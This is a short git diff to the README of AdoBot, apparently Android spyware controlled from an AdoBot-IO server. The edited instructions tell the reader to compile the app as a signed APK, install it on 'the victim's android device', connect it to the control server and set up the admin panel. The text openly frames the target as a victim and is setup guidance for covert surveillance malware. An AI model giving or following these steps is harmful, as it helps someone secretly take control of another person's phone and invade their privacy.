@@ -32,7 +32,7 @@ I developed this project with the code-maintainability in mind. I'm a web develo
 
 # Instructions
 
-Just compile and install the app to the victim's android device. Then start the app and set the URL of your [AdoBot-IO](https://github.com/adonespitogo/AdoBot-IO) server.
+Just compile (as signed APK) and install the app to the victim's android device. Then start the app and set the URL of your [AdoBot-IO](https://github.com/adonespitogo/AdoBot-IO) server.
 
 Next go to [https://github.com/adonespitogo/AdoBot-IO](https://github.com/adonespitogo/AdoBot-IO) and follow the instructions on setting up the admin panel.
 
